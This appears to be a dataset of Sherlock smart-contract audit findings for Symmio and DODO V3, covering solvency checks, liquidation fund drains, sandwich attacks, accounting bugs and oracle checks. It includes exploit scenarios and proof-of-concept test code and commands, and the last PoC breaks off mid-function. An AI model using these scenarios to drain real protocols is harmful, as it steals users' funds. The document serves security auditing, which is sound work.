Wrong calculation of solvency after request to close and after close positionчmediumч```\npartyAAvailableBalance = freeBalance + upnl + unlockedAmount = -5\n```\nч"`isSolventAfterClosePosition` and `isSolventAfterRequestToClosePosition` do not account for the extra profit that the user would get from closing the position.\nWhen a party A creates a request for closing a position, the `isSolventAfterRequestToClosePosition` function is called to check if the user is solvent after the request. In the same way, when someone tries to close a position, the `isSolventAfterClosePosition` function is called to check if both party A and party B are solvent after closing the position.\nBoth functions calculate the available balance for party A and party B, and revert if it is lower than zero. After that, the function accounts for the the extra loss that the user would get as a result of the difference between `closePrice` and `upnlSig.price`, and checks if the user is solvent after that.\nThe problem is that the function does not account for the opposite case, that is the case where the user would get an extra profit as a result of the difference between `closePrice` and `upnlSig.price`. This means that the user would not be able to close the position, even if at the end of the transaction they would be solvent.\nProof of Concept\nThere is an open position with:\nPosition type: LONG\nQuantity: 1\nLocked: 50\nOpened price: 100\nCurrent price: 110\nQuote position uPnL Party A: 10\nParty B calls `fillCloseRequest` with:\nClosed price: 120\nIn `isSolventAfterClosePosition` the following is calculated:\n```\npartyAAvailableBalance = freeBalance + upnl + unlockedAmount = -5\n```\n\nAnd it reverts on:\n```\nrequire(\n    partyBAvailableBalance >= 0 && partyAAvailableBalance >= 0,\n    ""LibSolvency: Available balance is lower than zero""\n);\n```\n\nHowever, the extra profit for `closedPrice - upnlSig.price = 120 - 110 = 10` is not accounted for in the `partyAAvailableBalance` calculation, that should be `partyAAvailableBalance` = - 5 + 10 = 5. Party A would be solvent after closing the position, but the transaction reverts."чAdd the extra profit to the `partyAAvailableBalance` calculation.\nDiscussion\nMoonKnightDev\nThe line that is checking whether the available balance is less than zero or not and reverts, is assessing the user's status if the position were to close right now. If it doesn't meet these conditions and doesn't pass, it implies that the user is already insolvent.\nshaka0x\nEscalate.\nEven if the user is not solvent at the beginning of the close process, I cannot find any reason for not allowing a user to close a position if the outcome is that they are not insolvent anymore and both parties receive what they are due, in the same way as a user may increase their collateral to recover solvency.\nsherlock-admin2\nEscalate.\nEven if the user is not solvent at the beginning of the close process, I cannot find any reason for not allowing a user to close a position if the outcome is that they are not insolvent anymore and both parties receive what they are due, in the same way as a user may increase their collateral to recover solvency.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\npanprog\nI agree with @shaka0x that this is a valid issue, even though very unlikely, but still possible, and it's more fair to let partyB close position with a price more favorable to partyA than requested, if it leads to solvent accounts after closure (even if partyA is insolvent at the current price).\nOn the other hand, I also understand the other point of view: if the user is already insolvent at the current price, he can be denied all position actions which will also be fair (as he's insolvent - he should be liquidated and no other actions allowed).\nUltimately I think this is a design choice, so it's up to developers to decide what is the expected behavior.\nMoonKnightDev\nThe system is designed to verify the user's solvency after a request to close, but I agree that this step may be unnecessary. It might be sufficient to check solvency solely within the fillCloseRequest() function.\npanprog\nThe system is designed to verify the user's solvency after a request to close, but I agree that this step may be unnecessary. It might be sufficient to check solvency solely within the fillCloseRequest() function.\nThe report is not about user being insolvent at the time of request to close, it's about user being insolvent at market price, but solvent at the requested price (during request to close) or at the closePrice (during fill close request).\nDuring request (long position):\nCurrent price is $1000. User is insolvent at this price, but solvent at price $1010. He requests to close at $1010, but transaction reverts (although it should allow user request to be closed at price $1010)\nDuring fillCloseRequest:\nUser requested to close at market price $1000, he was solvent at that time\nBy the time partyB calls fillCloseRequest, market price is still $1000, but user is insolvent at price $1000 (due to the other positions he has), but is solvent at price $1010.\nPartyB calls fillCloseRequest with a closePrice = $1010 (when market price = $1000). User is solvent at price $1010 and position should close successfully, but it reverts because user is insolvent at current market price ($1000).\nMoonKnightDev\nFixed code PR link: https://github.com/SYMM-IO/symmio-core/pull/21\nhrishibhat\nResult: Medium Unique Considering this a valid medium based on the above comments\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nshaka0x: acceptedчIn a situation where the difference between the closed price and the current price will make the user solvent, users will not be able to close their positions, even if at the end of the transaction they would be solvent.\nCode Snippet\nTool used\nManual Review
Consecutive symbol price updates can be exploited to drain protocol fundsчmediumч```\ngit apply exploit-liquidation.patch\nnpx hardhat test\n```\nчRepeatedly updating the symbol prices for the symbols used in Party A's positions mid-way through a liquidation while maintaining the same Party A's UPnL and total unrealized losses leads to more profits for Party B and effectively steals funds from the protocol.\nThe `setSymbolsPrice` function in the `LiquidationFacetImpl` library is used to set the prices of symbols for Party A's positions. It is called by the liquidator, who supplies the `PriceSig memory priceSig` argument, which contains, among other values, the prices of the symbols as well as the `upnl` and `totalUnrealizedLoss` of Party A's positions.\nParty A's `upnl` and `totalUnrealizedLoss` values are stored in Party A's liquidation details and enforced to remain the same for consecutive calls to `setSymbolsPrice` via the `require` statement in lines 90-95.\nHowever, as long as those two values remain the same, the liquidator can set the prices of the symbols to the current market prices (fetched by the Muon app). If a liquidator liquidates Party A's open positions in multiple calls to `liquidatePositionsPartyA` and updates symbol prices in between, Party B potentially receives more profits than they should have.\nThe git diff below contains a test case to demonstrate the following scenario:\nGiven the following symbols:\n`BTCUSDT`\n`AAVEUSDT`\nFor simplicity, we assume trading fees are 0.\nParty A's allocated balance: `100e18 USDT`\nParty A has two open positions with Party B:\nID Symbol Order Type Position Type Quantity Price Total Value CVA LF MM Total Locked Leverage\n1 BTCUSDT LIMIT LONG 100e18 1e18 100e18 25e18 25e18 0 50e18 2\n2 AAVEUSDT LIMIT LONG 100e18 1e18 100e18 25e18 25e18 0 50e18 2\nParty A's available balance: 100e18 - 100e18 = 0 USDT\nNow, the price of `BTCUSDT` drops by 40% to `0.6e18 USDT`. Party A's `upnl` and `totalUnrealizedLoss` are now `-40e18 USDT` and `-40e18 USDT`, respectively.\nParty A is insolvent and gets liquidated.\nThe liquidator calls `setSymbolsPrice` for both symbols, setting the price of `BTCUSDT` to `0.6e18 USDT` and the price of `AAVEUSDT` to `1e18 USDT`. The `liquidationDetails` of Party A are as follows:\nliquidationType: `LiquidationType.NORMAL`\nupnl: `-40e18 USDT`\ntotalUnrealizedLoss: `-40e18 USDT`\ndeficit: 0\nliquidationFee: `50e18 - 40e18 = 10e18 USDT`\nThe liquidator first liquidates position 1 -> Party B receives `40e18 USDT` + `25e18 USDT` (CVA) = `65e18 USDT`\nNow, due to a volatile market, the price of `AAVEUSDT` drops by 40% to `0.6e18 USDT`. The liquidator calls `setSymbolsPrice` again, setting the price of `AAVEUSDT` to `0.6e18 USDT`. `upnl` and `totalUnrealizedLoss` remain the same. Thus the symbol prices can be updated.\nThe liquidator liquidates position 2 -> Party B receives `40e18 USDT` + `25e18 USDT` (CVA) = `65e18 USDT`\nParty B received in total `65e18 + 65e18 = 130e18 USDT`, which is `30e18` USDT more than Party A's initially locked balances. Those funds are effectively stolen from the protocol and bad debt.\nConversely, if both positions had been liquidated in the first call without updating the symbol prices in between, Party B would have received `40e18 + 25e18 = 65e18 USDT`, which Party A's locked balances covered.\n\nHow to run this test case:\nSave git diff to a file named `exploit-liquidation.patch` and run with\n```\ngit apply exploit-liquidation.patch\nnpx hardhat test\n```\nч
User can perform sandwich attack on withdrawReserves for profitчhighч```\n// exchangeRate = (cash + totalBorrows -reserves) / dTokenSupply\n```\nчA malicious user could listen to the mempool for calls to `withdrawReserves`, at which point they can perform a sandwich attack by calling `userDeposit` before the withdraw reserves transaction and then `userWithdraw` after the withdraw reserves transaction. They can accomplish this using a tool like flashbots and make an instantaneous profit due to changes in exchange rates.\nWhen a user deposits or withdraws from the vault, the exchange rate of the token is calculated between the token itself and its dToken. As specified in an inline comment, the exchange rate is calculated like so:\n```\n// exchangeRate = (cash + totalBorrows -reserves) / dTokenSupply\n```\n\nwhere `reserves = info.totalReserves - info.withdrawnReserves`. When the owner of the vault calls `withdrawReserves` the withdrawnReserves value increases, so the numerator of the above formula increases, and thus the exchange rate increases. An increase in exchange rate means that the same number of dTokens is now worth more of the underlying ERC20.\nBelow is a diff to the existing test suite that demonstrates the sandwich attack in action:ч"
Calls to liquidate don't write down totalBorrows which breaks exchange rateчhighч```\nrecord.amount = borrows - debtToCover;\n```\nчWhen a pool is liquidated, the `totalBorrows` storage slot for the token in question should be decremented by `debtToCover` in order to keep the exchange rate of the corresponding `pToken` correct.\nWhen users call `liquidate` to `liquidate` a pool, they specify the amount of debt they want to cover. In the end this is used to write down the borrow amount of the pool in question:\n```\nrecord.amount = borrows - debtToCover;\n```\n\nHowever, the `totalBorrows` of the token isn't written down as well (like it should be). The `finishLiquidation` method correctly writes down the `totalBorrows` state.чThe `liquidate` method should include the following line to write down the total borrow amount of the debt token being liquidated:\n```\ninfo.totalBorrows = info.totalBorrows - debtToCover;\n```\n\nDiscussion\ndjb15\nEscalate\nThis is not a duplicate of #211. I believe this and #157 should be grouped together separately.\n#211 is about the vault token balance not being updated during liquidations which allows users to claim more dTokens than they should with new deposits.\nThis issue (and #157) is about the exchange rate for the token being broken during liquidations due to a different variable not being updated. The solution for this issue is different to the solution to #211. The only similarity is that both issues occur during calls to `liquidate`.\nsherlock-admin2\nEscalate\nThis is not a duplicate of #211. I believe this and #157 should be grouped together separately.\n#211 is about the vault token balance not being updated during liquidations which allows users to claim more dTokens than they should with new deposits.\nThis issue (and #157) is about the exchange rate for the token being broken during liquidations due to a different variable not being updated. The solution for this issue is different to the solution to #211. The only similarity is that both issues occur during calls to `liquidate`.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nmaarcweiss\nAgree with escalation. #157 and #211 do not describe the same issue as #46 and should be duped together\ndjb15\n@maarcweiss Just to confirm, I'm suggesting #46 and #157 are duped together, and #211 is duped with #68, #122 and #156. I.e.\nIssue A: #46, #157 Issue B: #211, #68, #122, #156\nJust thought I'd check as the above message seems to suggest the opposite :)\nhrishibhat\nResult: High Has duplicates Agree with the above escalation and comments and two separate sets of issues that should be valid issues\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\ndjb15: acceptedчWhen a user calls `liquidate` to `liquidate` a pool, the exchange rate of the token (from its pToken) remains high (because the `totalBorrows` for the token isn't decremented). The result is that users that have deposited this ERC20 token are receiving a higher rate of interest than they should. Because this interest is not being covered by anyone the end result is that the last withdrawer from the vault will not be able to redeem their pTokens because there isn't enough of the underlying ERC20 token available. The longer the period over which interest accrues, the greater the incentive for LPs to withdraw early.\nCode Snippet\nTool used\nManual Review
When a D3MM pool repays all of the borrowed funds to vault using `D3Funding.sol repayAll`, an attacker can steal double the amount of those funds from vaultчhighч```\n    function _poolRepayAll(address pool, address token) internal {\n        .\n        .\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance - amount; // amount should be added here\n        .\n        .\n    }\n```\nч`amount` should be added in `info.balance` instead of being subtracted.\n```\n    function _poolRepayAll(address pool, address token) internal {\n        .\n        .\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance - amount; // amount should be added here\n        .\n        .\n    }\n```\n\n```\n    function repayAll(address token) external onlyOwner nonReentrant poolOngoing {\n        ID3Vault(state._D3_VAULT_).poolRepayAll(token);\n        _updateReserve(token);\n        require(checkSafe(), Errors.NOT_SAFE);\n    }\n```\n\nThe vault keeps a record of borrowed funds and its current token balance.\n`_poolRepayAll()` is supposed to:\nDecrease the borrowed funds by the repaid amount\nIncrease the token balance by the same amount #vulnerability\nTransfer the borrowed funds from pool to vault\nHowever, `_poolRepayAll()` is decreasing the token balance instead.\n```\n    function _poolRepayAll(address pool, address token) internal {\n        .\n        .\n        .\n        .\n\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance - amount; // amount should be added here\n\n        IERC20(token).safeTransferFrom(pool, address(this), amount);\n\n        emit PoolRepay(pool, token, amount, interests);\n    }\n```\n\nLet's say a vault has 100,000 USDC A pool borrows 20,000 USDC from vault\nWhen the pool calls `poolRepayAll()`, the asset info in vault will change as follows:\n`totalBorrows => 20,000 - 20,000 => 0` // info.totalBorrows - amount\n`balance => 100,000 - 20,000 => 80,000` // info.balance - amount\n`tokens owned by vault => 100,000 + 20,000 => 120,000 USDC` // 20,000 USDC is transferred from pool to vault (repayment)\nThe difference of recorded balance (80,000) and actual balance (120,000) is `40,000 USDC`\nAn attacker waits for the `poolRepayAll()` function call by a pool.\n```\n    function userDeposit(address user, address token) external nonReentrant allowedToken(token) {\n        .\n        .\n        .\n        AssetInfo storage info = assetInfo[token];\n        uint256 realBalance = IERC20(token).balanceOf(address(this)); // check tokens owned by vault\n        uint256 amount = realBalance - info.balance; // amount = 120000-80000\n        .\n        .\n        .\n        IDToken(info.dToken).mint(user, dTokenAmount);\n        info.balance = realBalance;\n\n        emit UserDeposit(user, token, amount);\n    }\n```\nчSource: https://github.com/sherlock-audit/2023-06-dodo-judging/issues/217\nFound by\n0x4db5362c, 0xG0P1, 0xkaden, HALITUS, Proxy, Sulpiride, dirk_y, osmanozdemir1, seeques, skyge\nCurrent code: `info.balance = info.balance - amount;`\nNew (replace '-' with '+'): `info.balance = info.balance + amount;`\nDiscussion\ntraceurl\nFixed in this PR: https://github.com/DODOEX/new-dodo-v3/pull/26чCode Snippet\n```\n    function _poolRepayAll(address pool, address token) internal {\n        .\n        .\n        info.totalBorrows = info.totalBorrows - amount;\n        info.balance = info.balance - amount; // vulnerability: amount should be added here\n\n        IERC20(token).safeTransferFrom(pool, address(this), amount);\n\n        emit PoolRepay(pool, token, amount, interests);\n    }\n```\n\nTool used\nManual Review
possible precision loss in D3VaultLiquidation.finishLiquidation() function when calculating realDebt because of division before multiplicationчmediumч```\nuint256 realDebt = borrows.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n```\nчfinishLiquidation() divides before multiplying when calculating realDebt.\n```\nuint256 realDebt = borrows.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n```\n\nThere will be precision loss when calculating the realDebt because solidity truncates values when dividing and dividing before multiplying causes precision loss.\nValues that suffered from precision loss will be updated here\n```\n info.totalBorrows = info.totalBorrows - realDebt;\n```\nчdon't divide before multiplyingчValues that suffered from precision loss will be updated here\n```\n info.totalBorrows = info.totalBorrows - realDebt;\n```\n\nCode Snippet\nTool used\nManual Review
D3Oracle.getPrice() and D3Oracle.getOriginalPrice() doesn't check If Arbitrum sequencer is down for Chainlink feedsчmediumч"```\n function getPrice(address token) public view override returns (uint256) {\n        require(priceSources[token].isWhitelisted, ""INVALID_TOKEN"");\n        AggregatorV3Interface priceFeed = AggregatorV3Interface(priceSources[token].oracle);\n        (uint80 roundID, int256 price,, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\n        require(price > 0, ""Chainlink: Incorrect Price"");\n        require(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\n        require(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n        return uint256(price) * 10 ** (36 - priceSources[token].priceDecimal - priceSources[token].tokenDecimal);\n    }\n```\n"ч"When utilizing Chainlink in L2 chains like Arbitrum, it's important to ensure that the prices provided are not falsely perceived as fresh, even when the sequencer is down. This vulnerability could potentially be exploited by malicious actors to gain an unfair advantage.\nThere is no check in D3Oracle.getPrice()\n```\n function getPrice(address token) public view override returns (uint256) {\n        require(priceSources[token].isWhitelisted, ""INVALID_TOKEN"");\n        AggregatorV3Interface priceFeed = AggregatorV3Interface(priceSources[token].oracle);\n        (uint80 roundID, int256 price,, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\n        require(price > 0, ""Chainlink: Incorrect Price"");\n        require(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\n        require(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n        return uint256(price) * 10 ** (36 - priceSources[token].priceDecimal - priceSources[token].tokenDecimal);\n    }\n```\n\nno check in D3Oracle.getOriginalPrice() too\n```\n function getOriginalPrice(address token) public view override returns (uint256, uint8) {\n        require(priceSources[token].isWhitelisted, ""INVALID_TOKEN"");\n        AggregatorV3Interface priceFeed = AggregatorV3Interface(priceSources[token].oracle);\n        (uint80 roundID, int256 price,, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\n        require(price > 0, ""Chainlink: Incorrect Price"");\n        require(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\n        require(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n        uint8 priceDecimal = priceSources[token].priceDecimal;\n        return (uint256(price), priceDecimal);\n    }\n```\n"чcode example of Chainlink: https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-codeчcould potentially be exploited by malicious actors to gain an unfair advantage.\nCode Snippet\nTool used\nManual Review
`D3VaultFunding.userWithdraw()` doen not have mindTokenAmountчmediumч"```\nfunction userWithdraw(address to, address user, address token, uint256 dTokenAmount) external nonReentrant allowedToken(token) returns(uint256 amount) {\n        accrueInterest(token);\n        AssetInfo storage info = assetInfo[token];\n        require(dTokenAmount <= IDToken(info.dToken).balanceOf(msg.sender), Errors.DTOKEN_BALANCE_NOT_ENOUGH);\n\n        amount = dTokenAmount.mul(_getExchangeRate(token));//@audit does not check amount value\n        IDToken(info.dToken).burn(msg.sender, dTokenAmount);\n        IERC20(token).safeTransfer(to, amount);\n        info.balance = info.balance - amount;\n\n        // used for calculate user withdraw amount\n        // this function could be called from d3Proxy, so we need ""user"" param\n        // In the meantime, some users may hope to use this function directly,\n        // to prevent these users fill ""user"" param with wrong addresses,\n        // we use ""msg.sender"" param to check.\n        emit UserWithdraw(msg.sender, user, token, amount);\n    }\n```\n"ч"`D3VaultFunding.userWithdraw()` doen not have mindTokenAmount, and use `_getExchangeRate` directly.This is vulnerable to a sandwich attack.\nAs we can see, `D3VaultFunding.userWithdraw()` doen not have mindTokenAmount, and use `_getExchangeRate` directly.\n```\nfunction userWithdraw(address to, address user, address token, uint256 dTokenAmount) external nonReentrant allowedToken(token) returns(uint256 amount) {\n        accrueInterest(token);\n        AssetInfo storage info = assetInfo[token];\n        require(dTokenAmount <= IDToken(info.dToken).balanceOf(msg.sender), Errors.DTOKEN_BALANCE_NOT_ENOUGH);\n\n        amount = dTokenAmount.mul(_getExchangeRate(token));//@audit does not check amount value\n        IDToken(info.dToken).burn(msg.sender, dTokenAmount);\n        IERC20(token).safeTransfer(to, amount);\n        info.balance = info.balance - amount;\n\n        // used for calculate user withdraw amount\n        // this function could be called from d3Proxy, so we need ""user"" param\n        // In the meantime, some users may hope to use this function directly,\n        // to prevent these users fill ""user"" param with wrong addresses,\n        // we use ""msg.sender"" param to check.\n        emit UserWithdraw(msg.sender, user, token, amount);\n    }\n```\n\nAnd the `_getExchangeRate()` result is about `cash` , `info.totalBorrows`, info.totalReserves,info.withdrawnReserves,dTokenSupply,This is vulnerable to a sandwich attack leading to huge slippage\n```\nfunction _getExchangeRate(address token) internal view returns (uint256) {\n        AssetInfo storage info = assetInfo[token];\n        uint256 cash = getCash(token);\n        uint256 dTokenSupply = IERC20(info.dToken).totalSupply();\n        if (dTokenSupply == 0) { return 1e18; }\n        return (cash + info.totalBorrows - (info.totalReserves - info.withdrawnReserves)).div(dTokenSupply);\n    } \n```\n"чAdd `mindTokenAmount` parameter for `userWithdraw()` function and check if `amount < mindTokenAmount`\nDiscussion\nAttens1423\nWe will add slippage protection in D3ProxyчThis is vulnerable to a sandwich attack.\nCode Snippet\nTool used\nManual Review
D3Oracle will return the wrong price if the Chainlink aggregator returns price outside min/max rangeчmediumч"```\n(uint80 roundID, int256 price,, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\nrequire(price > 0, ""Chainlink: Incorrect Price"");\nrequire(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\nrequire(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n```\n"ч"Chainlink oracles have a min and max price that they return. If the price goes below the minimum price the oracle will not return the correct price but only the min price. Same goes for the other extremity.\nBoth `getPrice()` and `getOriginalPrice()` only check `price > 0` not are they within the correct range\n```\n(uint80 roundID, int256 price,, uint256 updatedAt, uint80 answeredInRound) = priceFeed.latestRoundData();\nrequire(price > 0, ""Chainlink: Incorrect Price"");\nrequire(block.timestamp - updatedAt < priceSources[token].heartBeat, ""Chainlink: Stale Price"");\nrequire(answeredInRound >= roundID, ""Chainlink: Stale Price"");\n```\n"ч"Check the latest answer against reasonable limits and/or revert in case you get a bad price\n```\n require(price >= minAnswer && price <= maxAnswer, ""invalid price"");\n```\n\nDiscussion\nAttens1423\nHow can we get minPrice and maxPrice from oracle contract? Could you give us a more detailed procession?\n0xffff11\nhttps://docs.chain.link/data-feeds#check-the-latest-answer-against-reasonable-limits @Attens1423\nAttens1423\nWe understand this doc. If you could offer a code example, including how to get minPrice and maxPrice from code, we would appreciate it"чCode Snippet\nTool used\nManual Review
parseAllPrice not support the tokens whose decimal is greater than 18чmediumч```\n        // fix price decimal\n        if (tokenDecimal != 18) {\n            uint256 fixDecimal = 18 - tokenDecimal;\n            bidDownPrice = bidDownPrice / (10 ** fixDecimal);\n            bidUpPrice = bidUpPrice / (10 ** fixDecimal);\n            askDownPrice = askDownPrice * (10 ** fixDecimal);\n            askUpPrice = askUpPrice * (10 ** fixDecimal);\n        }\n```\nч`parseAllPrice` not support the token decimal is greater than 18, such as NEAR with 24 decimal. Since `buyToken / sellToken` is dependent on `parseAllPrice`, so users can't trade tokens larger than 18 decimal, but DODOv3 is intended to be compatible with all standard ERC20, which is not expected.\n```\n        // fix price decimal\n        if (tokenDecimal != 18) {\n            uint256 fixDecimal = 18 - tokenDecimal;\n            bidDownPrice = bidDownPrice / (10 ** fixDecimal);\n            bidUpPrice = bidUpPrice / (10 ** fixDecimal);\n            askDownPrice = askDownPrice * (10 ** fixDecimal);\n            askUpPrice = askUpPrice * (10 ** fixDecimal);\n        }\n```\n\nIf `tokenDecimal > 18`, `18 - tokenDecimal` will revertчFix decimal to 36 instead of 18\nDiscussion\ntraceurl\nKuTuGu\nEscalate There are two questions:\nThis issue does not seem to be the repeat of the other two issues, they refer to overflows where the sum of two oracle token decimals is greater than 36, while this issue targets overflows where a single token decimal is greater than 18\nSponsor indicates that it is mainly for chainlink tokens, and there are tokens greater than 18 decimals on the main network: NEAR: 24 decimals, address: https://etherscan.io/token/0x85f17cf997934a597031b2e18a9ab6ebd4b9f6a4, oracle: https://etherscan.io/address/0xC12A6d1D827e23318266Ef16Ba6F397F2F91dA9b\nsherlock-admin2\nEscalate There are two questions:\nThis issue does not seem to be the repeat of the other two issues, they refer to overflows where the sum of two oracle token decimals is greater than 36, while this issue targets overflows where a single token decimal is greater than 18\nSponsor indicates that it is mainly for chainlink tokens, and there are tokens greater than 18 decimals on the main network: NEAR: 24 decimals, address: https://etherscan.io/token/0x85f17cf997934a597031b2e18a9ab6ebd4b9f6a4, oracle: https://etherscan.io/address/0xC12A6d1D827e23318266Ef16Ba6F397F2F91dA9b\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nmaarcweiss\nI agree with escalation. As > 18 decimals tokens are more than just one specific non standard erc20, and the likelihood is higher, I would agree with a medium\nhrishibhat\nResult: Medium Unique Considering this a valid medium\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nkutugu: accepted\ntraceurl\nWe will not support tokens whose decimals are greater than 18, like NEAR. We use D3Oracle to whitelist tokens. Even if a token has chainlink price feed, if it's decimals are greater than 18, we will not add it to D3Oracle.чDODOv3 is not compatible the tokens whose decimal is greater than 18, users can't trade them.\nCode Snippet\nTool used\nManual Review
D3VaultFunding#checkBadDebtAfterAccrue is inaccurate and can lead to further damage to both LP's and MMчmediumч```\n        if (balance >= borrows) {\n            collateral += min(balance - borrows, info.maxCollateralAmount).mul(info.collateralWeight).mul(price);\n        } else {\n            debt += (borrows - balance).mul(info.debtWeight).mul(price);\n        }\n```\nчD3VaultFunding#checkBadDebtAfterAccrue makes the incorrect assumption that a collateral ratio of less than 1e18 means that the pool has bad debt. Due to how collateral and debt weight affect the collateral ratio calculation a pool can have a collateral ratio less than 1e18 will still maintaining debt that is profitable to liquidate. The result of this is that the after this threshold has been passed, a pool can no longer be liquidate by anyone which can lead to continued losses that harm both the LPs and the MM being liquidated.\n```\n        if (balance >= borrows) {\n            collateral += min(balance - borrows, info.maxCollateralAmount).mul(info.collateralWeight).mul(price);\n        } else {\n            debt += (borrows - balance).mul(info.debtWeight).mul(price);\n        }\n```\n\nWhen calculating the collateral and debt values, the value of the collateral is adjusted by the collateralWeight and debtWeight respectively. This can lead to a position in which the collateral ratio is less than 1e18, which incorrectly signals the pool has bad debt via the checkBadDebtAfterAccrue check.\nExample:\n```\nAssume a pool has the following balances and debts:\n\nToken A - 100 borrows 125 balance\nToken B - 100 borrows 80 balance\n\nPrice A = 1\ncollateralWeightA = 0.8\n\nPrice B = 1\ndebtWeightB = 1.2\n\ncollateral = 25 * 1 * 0.8 = 20\ndebt = 20 * 1 * 1.2 = 24\n\ncollateralRatio = 20/24 = 0.83\n```\n\nThe problem here is that there is no bad debt at all and it is still profitable to liquidate this pool, even with a discount:\n```\nExcessCollateral = 125 - 100 = 25\n\n25 * 1 * 0.95 [DISCOUNT] = 23.75\n\nExcessDebt = 100 - 80 = 20\n\n20 * 1 = 20\n```\n\nThe issue with this is that once this check has been triggered, no other market participants besides DODO can liquidate this position. This creates a significant inefficiency in the market that can easily to real bad debt being created for the pool. This bad debt is harmful to both the pool MM, who could have been liquidated with remaining collateral, and also the vault LPs who directly pay for the bad debt.чThe methodology of the bad debt check should be changed to remove collateral and debt weights to accurately indicate the presence of bad debt.\nDiscussion\nAttens1423\n```\nuint256 realDebt = borrows.div(record.interestIndex == 0 ? 1e18 : record.interestIndex).mul(info.borrowIndex);\n// if balance > realDebt, transferFrom realDebt instead of debt\nIERC20(token).transferFrom(pool, address(this), realDebt); \n```\n\nhrishibhat\n@IAm0x52\nAttens1423\nWe have discovered some hidden issues in the dodo liquidation process, and we agree to modify the check of bad debts.чUnnecessary loss of funds to LPs and MMs\nCode Snippet\nTool used\nManual Review
Calculation B0 meets devision 0 error when a token has small decimal and high price with a small kBidчmediumч"```\n   function testQueryFail() public {\n        token1ChainLinkOracle.feedData(30647 * 1e18);\n        token2ChainLinkOracle.feedData(1 * 1e18);\n        vm.startPrank(maker);\n        uint32[] memory tokenKs = new uint32[](2);\n        tokenKs[0] = 0;\n        tokenKs[1] = (1<< 16) +1;\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(token2);\n        tokens[1] = address(token1);\n        address[] memory slotIndex = new address[](2);\n        slotIndex[0] = address(token1);\n        slotIndex[1] = address(token2);\n        uint80[] memory priceSlot = new uint80[](2);\n        priceSlot[0] = 2191925019632266903652;\n        priceSlot[1] = 720435765840878108682;\n\n        uint64[] memory amountslot = new uint64[](2);\n        amountslot[0] = stickAmount(10,8, 400000, 18);\n        amountslot[1] = stickAmount(400000, 18, 400000, 18);\n        d3MakerWithPool.setTokensKs(tokens, tokenKs);\n        d3MakerWithPool.setTokensPrice(slotIndex, priceSlot);\n        d3MakerWithPool.setTokensAmounts(slotIndex, amountslot);\n        vm.stopPrank();\n\n        (uint256 askDownPrice, uint256 askUpPrice, uint256 bidDownPrice, uint256 bidUpPrice, uint256 swapFee) =\n            d3MM.getTokenMMPriceInfoForRead(address(token1));\n        assertEq(askDownPrice, 304555028000000000000000000000000);\n        assertEq(askUpPrice, 307231900000000000000000000000000);\n        assertEq(bidDownPrice, 3291);\n        assertEq(bidUpPrice, 3320);\n        assertEq(swapFee, 1200000000000000);\n\n        //console.log(askDownPrice);\n        //console.log(askUpPrice);\n        //console.log(bidDownPrice);\n        //console.log(bidUpPrice);\n        //console.log(swapFee);\n\n        (,,uint kask, uint kbid,,) = d3MM.getTokenMMOtherInfoForRead(address(token1));\n        assertEq(kask, 1e14);\n        assertEq(kbid, 1e14);\n\n        (askDownPrice, askUpPrice, bidDownPrice, bidUpPrice, swapFee) =\n            d3MM.getTokenMMPriceInfoForRead(address(token2));\n        assertEq(askDownPrice, 999999960000000000);\n        assertEq(askUpPrice, 1000799800000000000);\n        assertEq(bidDownPrice, 1000400120032008002);\n        assertEq(bidUpPrice, 1001201241249250852);\n        assertEq(swapFee, 200000000000000);\n\n        (,,kask, kbid,,) = d3MM.getTokenMMOtherInfoForRead(address(token2));\n        assertEq(kask, 0);\n        assertEq(kbid, 0);\n\n        //console.log(askDownPrice);\n        //console.log(askUpPrice);\n        //console.log(bidDownPrice);\n        //console.log(bidUpPrice);\n        //console.log(swapFee);\n        //console.log(kask);\n        //console.log(kbid);\n\n        SwapCallbackData memory swapData;\n        swapData.data = """";\n        swapData.payer = user1;\n\n        //uint256 gasleft1 = gasleft();\n        uint256 receiveToToken = d3Proxy.sellTokens(\n            address(d3MM),\n            user1,\n            address(token1),\n            address(token2),\n            1000000,\n            0,\n            abi.encode(swapData),\n            block.timestamp + 1000\n        );\n```\n"ч"Here is poc\n```\n   function testQueryFail() public {\n        token1ChainLinkOracle.feedData(30647 * 1e18);\n        token2ChainLinkOracle.feedData(1 * 1e18);\n        vm.startPrank(maker);\n        uint32[] memory tokenKs = new uint32[](2);\n        tokenKs[0] = 0;\n        tokenKs[1] = (1<< 16) +1;\n        address[] memory tokens = new address[](2);\n        tokens[0] = address(token2);\n        tokens[1] = address(token1);\n        address[] memory slotIndex = new address[](2);\n        slotIndex[0] = address(token1);\n        slotIndex[1] = address(token2);\n        uint80[] memory priceSlot = new uint80[](2);\n        priceSlot[0] = 2191925019632266903652;\n        priceSlot[1] = 720435765840878108682;\n\n        uint64[] memory amountslot = new uint64[](2);\n        amountslot[0] = 